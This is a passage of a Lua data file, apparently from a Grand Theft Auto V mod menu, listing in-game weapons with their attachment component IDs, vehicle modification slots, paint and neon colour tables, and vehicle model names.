                            name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                        }, {
                            name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                        }, {
                            name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                        }, {
                            name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                        }, {
                            name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                        }, {
                            name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                        }, {
                            name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                        }
                    }
                }
            }, AdvancedRifle = {
                id = "weapon_advancedrifle", name = "∑Advanced Rifle ", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_02"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_SMALL"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"
                        }
                    }
                }
            }, SpecialCarbine = {
                id = "weapon_specialcarbine", name = "∑Special Carbine", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_02"
                        }, {
                            name = "Drum Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_03"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, SpecialCarbineMkII = {
                id = "weapon_specialcarbine_mk2", name = "∑Special Carbine Mk II", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_02"
                        }, {
                            name = "Tracer Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Hollow Point Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"
                        }
                    }, Sights = {
                        {
                            name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                        }, {
                            name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                        }, {
                            name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, Barrel = {
                        {
                            name = "Default", id = "COMPONENT_AT_SC_BARREL_01"
                        }, {
                            name = "Heavy", id = "COMPONENT_AT_SC_BARREL_02"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                        }, {
                            name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                        }, {
                            name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                        }, {
                            name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                        }, {
                            name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                        }, {
                            name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                        }, {
                            name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                        }, {
                            name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                        }
                    }
                }
            }, BullpupRifle = {
                id = "weapon_bullpuprifle", name = "∑Bullpup Rifle", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_02"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_SMALL"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, BullpupRifleMkII = {
                id = "weapon_bullpuprifle_mk2", name = "∑Bullpup Rifle Mk II", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"
                        }, {
                            name = "Tracer Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Armor Piercing Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"
                        }
                    }, Sights = {
                        {
                            name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                        }, {
                            name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_MK2"
                        }, {
                            name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, Barrel = {
                        {
                            name = "Default", id = "COMPONENT_AT_BP_BARREL_01"
                        }, {
                            name = "Heavy", id = "COMPONENT_AT_BP_BARREL_02"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"
                        }, {
                            name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                        }, {
                            name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                        }, {
                            name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                        }, {
                            name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                        }, {
                            name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                        }, {
                            name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                        }, {
                            name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, CompactRifle = {
                id = "weapon_compactrifle", name = "∑Compact Rifle", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_02"
                        }, {
                            name = "Drum Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_03"
                        }
                    }
                }
            }
        }, LMG = {
            MG = {
                id = "weapon_mg", name = "∑MG", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_MG_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_MG_CLIP_02"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_SMALL_02"
                        }
                    }
                }
            }, CombatMG = {
                id = "weapon_combatmg", name = "∑Combat MG", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_COMBATMG_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_COMBATMG_CLIP_02"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, CombatMGMkII = {
                id = "weapon_combatmg_mk2", name = "∑Combat MG Mk II", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_02"
                        }, {
                            name = "Tracer Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_TRACER"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Hollow Point Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_FMJ"
                        }
                    }, Sights = {
                        {
                            name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                        }, {
                            name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
                        }, {
                            name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                        }
                    }, Barrel = {
                        {
                            name = "Default", id = "COMPONENT_AT_MG_BARREL_01"
                        }, {
                            name = "Heavy", id = "COMPONENT_AT_MG_BARREL_02"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                        }, {
                            name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                        }, {
                            name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                        }, {
                            name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                        }, {
                            name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                        }, {
                            name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                        }, {
                            name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                        }
                    }
                }
            }, GusenbergSweeper = {
                id = "weapon_gusenberg", name = "∑GusenbergSweeper", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_GUSENBERG_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_GUSENBERG_CLIP_02"
                        }
                    }
                }
            }
        }, Snipers = {
            SniperRifle = {
                id = "weapon_sniperrifle", name = "∑Sniper Rifle", bInfAmmo = false, mods = {
                    Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_LARGE"
                        }, {
                            name = "Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                        }
                    }
                }
            }, HeavySniper = {
                id = "weapon_heavysniper", name = "Heavy Sniper", bInfAmmo = false, mods = {
                    Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_LARGE"
                        }, {
                            name = "Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
                        }
                    }
                }
            }, HeavySniperMkII = {
                id = "weapon_heavysniper_mk2", name = "Heavy Sniper Mk II", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_02"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Armor Piercing Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"
                        }, {
                            name = "Explosive Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"
                        }
                    }, Sights = {
                        {
                            name = "Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_MK2"
                        }, {
                            name = "Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
                        }, {
                            name = "Nigt Vision Scope", id = "COMPONENT_AT_SCOPE_NV"
                        }, {
                            name = "Thermal Scope", id = "COMPONENT_AT_SCOPE_THERMAL"
                        }
                    }, Barrel = {
                        {
                            name = "Default", id = "COMPONENT_AT_SR_BARREL_01"
                        }, {
                            name = "Heavy", id = "COMPONENT_AT_SR_BARREL_02"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_SR_SUPP_03"
                        }, {
                            name = "Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"
                        }, {
                            name = "Bell-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_09"
                        }
                    }
                }
            }, MarksmanRifle = {
                id = "weapon_marksmanrifle", name = "∑Marksman Rifle", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_02"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, MarksmanRifleMkII = {
                id = "weapon_marksmanrifle_mk2", name = "∑Marksman Rifle Mk II", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"
                        }, {
                            name = "Tracer Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Hollow Point Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"
                        }
                    }, Sights = {
                        {
                            name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                        }, {
                            name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                        }, {
                            name = "Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, Barrel = {
                        {
                            name = "Default", id = "COMPONENT_AT_MRFL_BARREL_01"
                        }, {
                            name = "Heavy", id = "COMPONENT_AT_MRFL_BARREL_02"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"
                        }, {
                            name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                        }, {
                            name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                        }, {
                            name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                        }, {
                            name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                        }, {
                            name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                        }, {
                            name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                        }, {
                            name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                        }
                    }
                }
            }
        }, Heavy = {
            RPG = {
                id = "weapon_rpg", name = "∑RPG", bInfAmmo = false, mods = {}
            }, GrenadeLauncher = {
                id = "weapon_grenadelauncher", name = "∑Grenade Launcher", bInfAmmo = false, mods = {}
            }, GrenadeLauncherSmoke = {
                id = "weapon_grenadelauncher_smoke", name = "∑Grenade Launcher Smoke", bInfAmmo = false, mods = {}
            }, Minigun = {
                id = "weapon_minigun", name = "∑Minigun", bInfAmmo = false, mods = {}
            }, FireworkLauncher = {
                id = "weapon_firework", name = "∑Firework Launcher", bInfAmmo = false, mods = {}
            }, Railgun = {
                id = "weapon_railgun", name = "∑Railgun", bInfAmmo = false, mods = {}
            }, HomingLauncher = {
                id = "weapon_hominglauncher", name = "∑Homing Launcher", bInfAmmo = false, mods = {}
            }, CompactGrenadeLauncher = {
                id = "weapon_compactlauncher", name = "∑Compact Grenade Launcher", bInfAmmo = false, mods = {}
            }, Widowmaker = {
                id = "weapon_rayminigun", name = "∑Widowmaker", bInfAmmo = false, mods = {}
            }
        }, Throwables = {
            Grenade = {
                id = "weapon_grenade", name = "∑Grenade", bInfAmmo = false, mods = {}
            }, BZGas = {
                id = "weapon_bzgas", name = "∑BZ Gas", bInfAmmo = false, mods = {}
            }, MolotovCocktail = {
                id = "weapon_molotov", name = "∑Molotov Cocktail", bInfAmmo = false, mods = {}
            }, StickyBomb = {
                id = "weapon_stickybomb", name = "∑Sticky Bomb", bInfAmmo = false, mods = {}
            }, ProximityMines = {
                id = "weapon_proxmine", name = "∑Proximity Mines", bInfAmmo = false, mods = {}
            }, Snowballs = {
                id = "weapon_snowball", name = "∑Snowballs", bInfAmmo = false, mods = {}
            }, PipeBombs = {
                id = "weapon_pipebomb", name = "∑Pipe Bombs", bInfAmmo = false, mods = {}
            }, Baseball = {
                id = "weapon_ball", name = "∑Baseball", bInfAmmo = false, mods = {}
            }, TearGas = {
                id = "weapon_smokegrenade", name = "∑Tear Gas", bInfAmmo = false, mods = {}
            }, Flare = {
                id = "weapon_flare", name = "∑Flare", bInfAmmo = false, mods = {}
            }
        }, Misc = {
            Parachute = {
                id = "gadget_parachute", name = "∑Parachute", bInfAmmo = false, mods = {}
            }, FireExtinguisher = {
                id = "weapon_fireextinguisher", name = "∑Fire Extinguisher", bInfAmmo = false, mods = {}
            }
        }
    }
    
    local bd = {
        {
            name = "Spoilers", id = 0
        }, {
            name = "Front Bumper", id = 1
        }, {
            name = "Rear Bumper", id = 2
        }, {
            name = "Side Skirt", id = 3
        }, {
            name = "Exhaust", id = 4
        }, {
            name = "Frame", id = 5
        }, {
            name = "Grille", id = 6
        }, {
            name = "Hood", id = 7
        }, {
            name = "Fender", id = 8
        }, {
            name = "Right Fender", id = 9
        }, {
            name = "Roof", id = 10
        }, {
            name = "Vanity Plates", id = 25
        }, {
            name = "Trim", id = 27
        }, {
            name = "Ornaments", id = 28
        }, {
            name = "Dashboard", id = 29
        }, {
            name = "Dial", id = 30
        }, {
            name = "Door Speaker", id = 31
        }, {
            name = "Seats", id = 32
        }, {
            name = "Steering Wheel", id = 33
        }, {
            name = "Shifter Leavers", id = 34
        }, {
            name = "Plaques", id = 35
        }, {
            name = "Speakers", id = 36
        }, {
            name = "Trunk", id = 37
        }, {
            name = "Hydraulics", id = 38
        }, {
            name = "Engine Block", id = 39
        }, {
            name = "Air Filter", id = 40
        }, {
            name = "Struts", id = 41
        }, {
            name = "Arch Cover", id = 42
        }, {
            name = "Aerials", id = 43
        }, {
            name = "Trim 2", id = 44
        }, {
            name = "Tank", id = 45
        }, {
            name = "Windows", id = 46
        }, {
            name = "Livery", id = 48
        }, {
            name = "Wheels", id = 23
        }, {
            name = "Wheel Types", id = "wheeltypes"
        }, {
            name = "Extras", id = "extra"
        }, {
            name = "Neons", id = "neon"
        }, {
            name = "Paint", id = "paint"
        }, {
            name = "Headlights Color", id = "headlight"
        },  {
            name = "Licence Plate", id = "licence"                           
        }
    }
    
    local be = {
        {
            name = "Engine", id = 11
        }, {
            name = "Brakes", id = 12
        }, {
            name = "Transmission", id = 13
        }, {
            name = "Suspension", id = 15
        }
    }
    
    local bo = {
        {
            name = "Default", id = -1
        }, {
            name = "White", id = 0
        }, {
            name = "Blue", id = 1
        }, {
            name = "Electric Blue", id = 2
        }, {
            name = "Mint Green", id = 3
        }, {
            name = "Lime Green", id = 4
        }, {
            name = "Yellow", id = 5
        }, {
            name = "Golden Shower", id = 6
        }, {
            name = "Orange", id = 7
        }, {
            name = "Red", id = 8
        }, {
            name = "Pony Pink", id = 9
        }, {
            name = "Hot Pink", id = 10
        }, {
            name = "Purple", id = 11
        }, {
            name = "Blacklight", id = 12
        }
    }
    
    local colors = {
        ["White"] = {
            255, 255, 255
        }, ["Blue"] = {
            0, 0, 255
        }, ["Electric Blue"] = {
            0, 150, 255
        }, ["Mint Green"] = {
            50, 255, 155
        }, ["Lime Green"] = {
            0, 255, 0
        }, ["Yellow"] = {
            255, 255, 0
        }, ["Golden Shower"] = {
            204, 204, 0
        }, ["Orange"] = {
            255, 128, 0
        }, ["Red"] = {
            255, 0, 0
        }, ["Pony Pink"] = {
            255, 102, 255
        }, ["Hot Pink"] = {
            255, 0, 255
        }, ["Purple"] = {
            153, 0, 153
        }
    }
    
    local bg = {
        {
            name = "Black", id = 0
        }, {
            name = "Carbon Black", id = 147
        }, {
            name = "Graphite", id = 1
        }, {
            name = "Anhracite Black", id = 11
        }, {
            name = "Black Steel", id = 2
        }, {
            name = "Dark Steel", id = 3
        }, {
            name = "Silver", id = 4
        }, {
            name = "Bluish Silver", id = 5
        }, {
            name = "Rolled Steel", id = 6
        }, {
            name = "Shadow Silver", id = 7
        }, {
            name = "Stone Silver", id = 8
        }, {
            name = "Midnight Silver", id = 9
        }, {
            name = "Cast Iron Silver", id = 10
        }, {
            name = "Red", id = 27
        }, {
            name = "Torino Red", id = 28
        }, {
            name = "Formula Red", id = 29
        }, {
            name = "Lava Red", id = 150
        }, {
            name = "Blaze Red", id = 30
        }, {
            name = "Grace Red", id = 31
        }, {
            name = "Garnet Red", id = 32
        }, {
            name = "Sunset Red", id = 33
        }, {
            name = "Cabernet Red", id = 34
        }, {
            name = "Wine Red", id = 143
        }, {
            name = "Candy Red", id = 35
        }, {
            name = "Hot Pink", id = 135
        }, {
            name = "Pfsiter Pink", id = 137
        }, {
            name = "Salmon Pink", id = 136
        }, {
            name = "Sunrise Orange", id = 36
        }, {
            name = "Orange", id = 38
        }, {
            name = "Bright Orange", id = 138
        }, {
            name = "Gold", id = 99
        }, {
            name = "Bronze", id = 90
        }, {
            name = "Yellow", id = 88
        }, {
            name = "Race Yellow", id = 89
        }, {
            name = "Dew Yellow", id = 91
        }, {
            name = "Dark Green", id = 49
        }, {
            name = "Racing Green", id = 50
        }, {
            name = "Sea Green", id = 51
        }, {
            name = "Olive Green", id = 52
        }, {
            name = "Bright Green", id = 53
        }, {
            name = "Gasoline Green", id = 54
        }, {
            name = "Lime Green", id = 92
        }, {
            name = "Midnight Blue", id = 141
        }, {
            name = "Galaxy Blue", id = 61
        }, {
            name = "Dark Blue", id = 62
        }, {
            name = "Saxon Blue", id = 63
        }, {
            name = "Blue", id = 64
        }, {
            name = "Mariner Blue", id = 65
        }, {
            name = "Harbor Blue", id = 66
        }, {
            name = "Diamond Blue", id = 67
        }, {
            name = "Surf Blue", id = 68
        }, {
            name = "Nautical Blue", id = 69
        }, {
            name = "Racing Blue", id = 73
        }, {
            name = "Ultra Blue", id = 70
        }, {
            name = "Light Blue", id = 74
        }, {
            name = "Chocolate Brown", id = 96
        }, {
            name = "Bison Brown", id = 101
        }, {
            name = "Creeen Brown", id = 95
        }, {
            name = "Feltzer Brown", id = 94
        }, {
            name = "Maple Brown", id = 97
        }, {
            name = "Beechwood Brown", id = 103
        }, {
            name = "Sienna Brown", id = 104
        }, {
            name = "Saddle Brown", id = 98
        }, {
            name = "Moss Brown", id = 100
        }, {
            name = "Woodbeech Brown", id = 102
        }, {
            name = "Straw Brown", id = 99
        }, {
            name = "Sandy Brown", id = 105
        }, {
            name = "Bleached Brown", id = 106
        }, {
            name = "Schafter Purple", id = 71
        }, {
            name = "Spinnaker Purple", id = 72
        }, {
            name = "Midnight Purple", id = 142
        }, {
            name = "Bright Purple", id = 145
        }, {
            name = "Cream", id = 107
        }, {
            name = "Ice White", id = 111
        }, {
            name = "Frost White", id = 112
        }
    }
    
    local bi = {
        {
            name = "Black", id = 12
        }, {
            name = "Gray", id = 13
        }, {
            name = "Light Gray", id = 14
        }, {
            name = "Ice White", id = 131
        }, {
            name = "Blue", id = 83
        }, {
            name = "Dark Blue", id = 82
        }, {
            name = "Midnight Blue", id = 84
        }, {
            name = "Midnight Purple", id = 149
        }, {
            name = "Schafter Purple", id = 148
        }, {
            name = "Red", id = 39
        }, {
            name = "Dark Red", id = 40
        }, {
            name = "Orange", id = 41
        }, {
            name = "Yellow", id = 42
        }, {
            name = "Lime Green", id = 55
        }, {
            name = "Green", id = 128
        }, {
            name = "Forest Green", id = 151
        }, {
            name = "Foliage Green", id = 155
        }, {
            name = "Olive Darb", id = 152
        }, {
            name = "Dark Earth", id = 153
        }, {
            name = "Desert Tan", id = 154
        }
    }
    
    local bj = {
        {
            name = "Brushed Steel", id = 117
        }, {
            name = "Brushed Black Steel", id = 118
        }, {
            name = "Brushed Aluminum", id = 119
        }, {
            name = "Pure Gold", id = 158
        }, {
            name = "Brushed Gold", id = 159
        }
    }
    
    local aA = {
        "Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"
    }
    local aB = {
        "Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"
    }
    local aC = {
        "Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"
    }
    local aD = {
        "CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"
    }
    local aE = {
        "Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3"
    }
    local aF = {
        "ambulance", "FBI", "FBI2", "FireTruk", "PBus", "police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"
    }
    local aG = {
        "Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"
    }
    local aH = {
        "Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"
    }
    local aI = {
        "APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"
    }
    local aJ = {
        "Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"
    }
    local aK = {
